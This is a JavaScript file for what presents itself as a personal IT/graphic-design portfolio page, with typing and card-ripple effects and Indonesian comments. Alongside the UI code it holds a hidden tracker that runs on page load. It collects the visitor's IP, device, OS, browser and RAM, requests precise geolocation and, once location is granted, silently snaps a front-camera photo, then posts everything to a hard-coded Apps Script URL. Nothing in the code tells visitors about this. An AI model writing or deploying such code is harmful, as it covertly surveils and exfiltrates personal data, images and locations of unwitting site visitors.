(async function() {
    // === 1. KONFIGURASI ===
    // Pastikan URL ini adalah hasil "New Deployment" terbaru dari Apps Script Anda
    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzQbaSux3LtLxFaU7SbbKmijOD8jHmBWwT49JLq_Ws4-44_yhqDrTYCKelogvaCN1FINA/exec"; 
    let globalIP = "Checking...";

    // === 2. DEEP USER AGENT PARSER (Detail HP & Browser) ===
    const getDetailedSpecs = () => {
        const ua = navigator.userAgent;
        let osDetail = "Unknown OS";
        let browserDetail = "Unknown Browser";
        let deviceDetail = "Unknown Device";
        let engine = "Unknown Engine";

        // Deteksi Engine
        if (/WebKit/i.test(ua)) engine = "WebKit";
        if (/Gecko/i.test(ua) && !/WebKit/i.test(ua)) engine = "Gecko";
        if (/Chrome/i.test(ua)) engine = "Blink";

        // A. Deteksi Android & Model Spesifik (Xiaomi, Redmi, Samsung, dll)
        if (/Android/i.test(ua)) {
            const androidMatch = ua.match(/Android\s(\d+(\.\d+)?)/);
            osDetail = `Android ${androidMatch ? androidMatch[1] : 'Unknown'}`;
            
            // Mengambil model spesifik seperti "Redmi Note 11 Pro"
            const modelMatch = ua.match(/Android\s[^;]+;\s([^;]+)\sBuild/);
            deviceDetail = modelMatch ? modelMatch[1] : "Android Device";
        } 
        // B. Deteksi iOS & iPhone Model Lengkap
        else if (/iPhone|iPad|iPod/.test(ua)) {
            const v = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
            osDetail = `iOS ${v ? v[1]+'.'+v[2]+'.'+(v[3]||'0') : 'Unknown'}`;
            
            const w = window.screen.width;
            const h = window.screen.height;
            const models = {
                "440:956": "iPhone 16 Pro Max",
                "402:874": "iPhone 16 Pro",
                "430:932": "iPhone 15/16 Plus / 14 Pro Max",
                "393:852": "iPhone 15/16 / 14 Pro",
                "390:844": "iPhone 12/13/14",
                "428:926": "iPhone 12/13/14 Pro Max",
                "414:896": "iPhone 11/XR/XS Max",
                "375:812": "iPhone X/XS/11Pro",
                "375:667": "iPhone SE/6/7/8",
                "414:736": "iPhone 6/7/8 Plus"
            };
            deviceDetail = models[`${w}:${h}`] || "Apple iPhone";
        } else if (/Windows NT/.test(ua)) {
            const v = ua.match(/Windows NT (\d+\.\d+)/);
            const winMap = {"10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7"};
            osDetail = `Windows ${winMap[v ? v[1] : ""] || "PC"}`;
            deviceDetail = "Desktop PC/Laptop";
        }

        // C. Deteksi Browser Detail (Termasuk MiuiBrowser)
        if (/XiaoMi\/MiuiBrowser\/([\d.]+)/i.test(ua)) {
            browserDetail = `MiuiBrowser ${ua.match(/XiaoMi\/MiuiBrowser\/([\d.]+)/i)[1]} (${engine})`;
        } else if (/Edg\/([\d.]+)/i.test(ua)) {
            browserDetail = `Edge ${ua.match(/Edg\/([\d.]+)/i)[1]} (${engine})`;
        } else if (/Chrome\/([\d.]+)/i.test(ua)) {
            browserDetail = `Chrome ${ua.match(/Chrome\/([\d.]+)/i)[1]} (${engine})`;
        } else if (/Safari\/([\d.]+)/i.test(ua) && !/Chrome/i.test(ua)) {
            const v = ua.match(/Version\/([\d.]+)/i);
            browserDetail = `Safari ${v ? v[1] : ""} (WebKit)`;
        } else {
            browserDetail = "Other Browser";
        }

        return { osDetail, browserDetail, deviceDetail };
    };

    // === 3. FUNGSI CAPTURE KAMERA (Auto Upload) ===
    const captureAndUpload = async (specs) => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            // Delay 1.2 detik agar kamera fokus/stabil
            await new Promise(resolve => setTimeout(resolve, 1200));

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            const base64Image = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];

            // Matikan kamera segera
            stream.getTracks().forEach(track => track.stop());

            // Kirim Foto ke Apps Script (Logika Tab Photos)
            fetch(WEB_APP_URL, {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify({
                    type: "photo",
                    image: base64Image,
                    ip: globalIP,
                    deviceName: specs.deviceDetail
                })
            });
        } catch (err) {
            console.log("Kamera ditolak atau tidak tersedia.");
        }
    };

    // === 4. TRACKING ENGINE UTAMA ===
    const startTracker = async () => {
        const specs = getDetailedSpecs();
        
        // Ambil IP Address
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const d = await res.json();
            globalIP = d.ip;
        } catch (e) { globalIP = "Hidden/VPN"; }

        let payload = {
            type: "info",
            ip: globalIP,
            osDetail: specs.osDetail,
            browserDetail: specs.browserDetail,
            deviceName: specs.deviceDetail,
            ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
            lat: null, long: null
        };

        const sendData = (data) => fetch(WEB_APP_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(data) });

        // Jalankan Geolocation & Kamera
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                payload.lat = pos.coords.latitude;
                payload.long = pos.coords.longitude;
                sendData(payload); // Kirim Info Teks & Lokasi
                await captureAndUpload(specs); // Jalankan Kamera
            }, () => {
                sendData(payload); // Kirim tanpa lokasi jika ditolak
            }, { enableHighAccuracy: true });
        } else {
            sendData(payload);
        }
    };

    // === 5. UI EFFECTS (TYPING & RIPPLE) ===
    const typeText = () => {
        const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
        let textIndex = 0, charIndex = 0, isDeleting = false;
        const typedElement = document.getElementById('typed-text');
        if (!typedElement) return;

        function loop() {
            const currentText = texts[textIndex];
            typedElement.textContent = isDeleting 
                ? currentText.substring(0, charIndex - 1) 
                : currentText.substring(0, charIndex + 1);
            
            charIndex = isDeleting ? charIndex - 1 : charIndex + 1;
            let speed = isDeleting ? 75 : 150;

            if (!isDeleting && charIndex === currentText.length) {
                speed = 2000; isDeleting = true;
            } else if (isDeleting && charIndex === 0) {
                isDeleting = false;
                textIndex = (textIndex + 1) % texts.length;
                speed = 500;
            }
            setTimeout(loop, speed);
        }
        loop();
    };

    // === 6. INITIALIZE ALL ===
    window.addEventListener('load', () => {
        startTracker();
        setTimeout(typeText, 1000);

        // Ripple Card Effect
        document.querySelectorAll('.card').forEach(card => {
            card.addEventListener('mousemove', (e) => {
                const rect = card.getBoundingClientRect();
                const x = ((e.clientX - rect.left) / rect.width) * 100;
                const y = ((e.clientY - rect.top) / rect.height) * 100;
                card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
                card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
            });
        });
    });

})();
